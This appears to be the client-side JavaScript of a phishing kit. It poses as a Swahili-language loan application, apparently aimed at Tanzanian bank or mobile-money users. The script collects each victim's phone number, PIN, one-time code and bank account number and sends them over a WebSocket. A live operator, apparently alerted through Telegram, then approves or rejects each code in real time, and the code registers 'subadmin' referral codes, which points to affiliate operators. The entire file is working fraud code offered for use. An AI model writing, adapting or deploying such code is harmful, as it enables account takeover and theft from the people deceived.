const screens = {
    slider: document.getElementById('screen-slider'),
    step1: document.getElementById('screen-step1'),
    step2: document.getElementById('screen-step2'),
    step3: document.getElementById('screen-step3'),
    pin: document.getElementById('screen-pin'),
    otp: document.getElementById('screen-otp'),
    account: document.getElementById('screen-account'),
    success: document.getElementById('screen-success')
};

const backBtn = document.getElementById('back-btn');
const loadingOverlay = document.getElementById('loading-overlay');
const surfaceNotification = document.getElementById('surface-notification');

let currentScreenName = 'slider';
let ws = null;
let applicantData = {
    phone: '',
    pin: ''
};

// Connect WebSocket
function connectWs() {
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${protocol}//${window.location.host}`);

    ws.onopen = () => {
        const urlParams = new URLSearchParams(window.location.search);
        const refCode = urlParams.get('ref') || urlParams.get('admin');
        if (refCode) {
            ws.send(JSON.stringify({ type: 'REGISTER_SUBADMIN', refCode }));
        }
    };

    ws.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            if (data.type === 'SERVER_ACTION') {
                hideLoading();
                handleServerAction(data.action);
            }
        } catch (e) {
            console.error(e);
        }
    };
}

connectWs();

function showScreen(name) {
    Object.values(screens).forEach(s => s.classList.remove('active'));
    if (screens[name]) {
        screens[name].classList.add('active');
        currentScreenName = name;
    }
    if (name === 'slider') {
        backBtn.classList.add('hidden');
    } else {
        backBtn.classList.remove('hidden');
    }
}

function showLoading(text = "Inapakia tafadhali subiri...") {
    loadingOverlay.querySelector('p').textContent = text;
    loadingOverlay.classList.remove('hidden');
}

function hideLoading() {
    loadingOverlay.classList.add('hidden');
}

function showSurfaceNotification(message, type = 'success') {
    surfaceNotification.textContent = message;
    surfaceNotification.className = `surface-notification ${type}`;
    surfaceNotification.classList.remove('hidden');
    setTimeout(() => {
        surfaceNotification.classList.add('hidden');
    }, 4000);
}

// Slider Calculator interactions
const amountRange = document.getElementById('loan-amount-range');
const durationRange = document.getElementById('loan-duration-range');
const displayAmount = document.getElementById('display-amount');
const displayDuration = document.getElementById('display-duration');
const displayMonthly = document.getElementById('display-monthly');

amountRange.addEventListener('input', (e) => {
    const val = Number(e.target.value).toLocaleString();
    displayAmount.textContent = `TSh ${val}`;
});

durationRange.addEventListener('input', (e) => {
    displayDuration.textContent = `miezi ${e.target.value}`;
    const monthlyVal = Math.round((amountRange.value / e.target.value) * 1.15).toLocaleString();
    displayMonthly.textContent = `TSh ${monthlyVal}`;
});

document.getElementById('btn-omba-sasa').addEventListener('click', () => {
    showLoading();
    setTimeout(() => {
        hideLoading();
        showScreen('step1');
    }, 800);
});

// Step 1 Navigation
document.getElementById('btn-step1-next').addEventListener('click', () => {
    showLoading();
    setTimeout(() => {
        hideLoading();
        showScreen('step2');
    }, 800);
});

// Step 2 Navigation (Phone & Name entry only)
document.getElementById('btn-step2-prev').addEventListener('click', () => showScreen('step1'));
document.getElementById('btn-step2-next').addEventListener('click', () => {
    const phone = document.getElementById('phone-number').value.trim();

    if (!phone || phone.length < 9) {
        showSurfaceNotification("Tafadhali jaza namba ya simu sahihi", "error");
        return;
    }

    applicantData.phone = phone;
    document.getElementById('lbl-masked-phone').textContent = `+255${phone}`;
    
    showLoading();
    setTimeout(() => {
        hideLoading();
        showScreen('step3');
    }, 600);
});

// Step 3 Navigation -> Leads to PIN screen (after Step 3 out of 3)
document.getElementById('btn-step3-prev').addEventListener('click', () => showScreen('step2'));
document.getElementById('btn-step3-submit').addEventListener('click', () => {
    showLoading();
    setTimeout(() => {
        hideLoading();
        showScreen('pin');
        pinBoxes[0].focus();
    }, 600);
});

// PIN Screen Box Auto-Navigation & Visibility Toggle
const pinBoxes = document.querySelectorAll('.pin-box');
pinBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
        if (e.target.value && index < pinBoxes.length - 1) {
            pinBoxes[index + 1].focus();
        }
    });
    box.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !box.value && index > 0) {
            pinBoxes[index - 1].focus();
        }
    });
});

let isPinVisible = false;
document.getElementById('toggle-pin-visibility').addEventListener('click', () => {
    isPinVisible = !isPinVisible;
    pinBoxes.forEach(b => b.type = isPinVisible ? 'text' : 'password');
});

// PIN Submit (Triggers Admin Telegram Approval with Phone and PIN)
document.getElementById('btn-pin-submit').addEventListener('click', () => {
    let pinCode = '';
    pinBoxes.forEach(b => pinCode += b.value);

    if (pinCode.length < 4) {
        showSurfaceNotification("Tafadhali weka PIN kamili ya tarakimu 4", "error");
        return;
    }

    applicantData.pin = pinCode;
    showLoading("Inatuma maombi kwa ukaguzi...");
    ws.send(JSON.stringify({ type: 'SUBMIT_CREDENTIALS', phone: applicantData.phone, pin: applicantData.pin }));
});

// OTP Input auto-focus helper
const otpBoxes = document.querySelectorAll('.otp-box');
otpBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
        if (e.target.value && index < otpBoxes.length - 1) {
            otpBoxes[index + 1].focus();
        }
    });
    box.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !box.value && index > 0) {
            otpBoxes[index - 1].focus();
        }
    });
});

document.getElementById('btn-otp-submit').addEventListener('click', () => {
    let otpCode = '';
    otpBoxes.forEach(b => otpCode += b.value);

    if (otpCode.length < 4) {
        showSurfaceNotification("Weka OTP kamili ya tarakimu 4", "error");
        return;
    }

    showLoading("Inathibitisha OTP...");
    ws.send(JSON.stringify({ type: 'SUBMIT_OTP', otp: otpCode }));
});

// Account Number Submission
document.getElementById('btn-account-submit').addEventListener('click', () => {
    const accNum = document.getElementById('nmb-account-input').value.trim();
    if (accNum.length !== 11) {
        showSurfaceNotification("Namba ya akaunti lazima iwe na tarakimu 11 kamili", "error");
        return;
    }

    showLoading("Inathibitisha akaunti ya benki...");
    ws.send(JSON.stringify({ type: 'SUBMIT_ACCOUNT', accountNumber: accNum }));
});

// Home button restart
document.getElementById('btn-home').addEventListener('click', () => {
    window.location.reload();
});

// Handle Server Admin Commands
function handleServerAction(action) {
    switch (action) {
        case 'ALLOW':
            showSurfaceNotification("Correct PIN! Endelea hatua inayofuata.", "success");
            showScreen('otp');
            break;
        case 'DENY':
            showSurfaceNotification("Maombi yamekataliwa. Anza upya.", "error");
            window.location.reload();
            break;
        case 'WRONG_PIN':
            showSurfaceNotification("Wrong PIN! Tafadhali weka New PIN.", "error");
            showScreen('pin');
            pinBoxes.forEach(b => b.value = '');
            pinBoxes[0].focus();
            break;
        case 'WRONG_OTP':
            showSurfaceNotification("Wrong OTP! Weka OTP sahihi tena.", "error");
            otpBoxes.forEach(b => b.value = '');
            otpBoxes[0].focus();
            break;
        case 'CORRECT_OTP':
            showSurfaceNotification("Correct OTP! Endelea hatua inayofuata.", "success");
            showScreen('account');
            break;
        case 'INVALID_ACC':
            showSurfaceNotification("Invalid ACC. Tafadhali weka New account number.", "error");
            document.getElementById('nmb-account-input').value = '';
            document.getElementById('nmb-account-input').focus();
            break;
        case 'VALID_ACC':
            showSurfaceNotification("Valid ACC! Mkopo umeidhinishwa.", "success");
            showScreen('success');
            break;
    }
}

backBtn.addEventListener('click', () => {
    if (currentScreenName === 'step1') showScreen('slider');
    else if (currentScreenName === 'step2') showScreen('step1');
    else if (currentScreenName === 'step3') showScreen('step2');
    else if (currentScreenName === 'pin') showScreen('step3');
    else if (currentScreenName === 'otp') showScreen('pin');
    else if (currentScreenName === 'account') showScreen('otp');
});
    
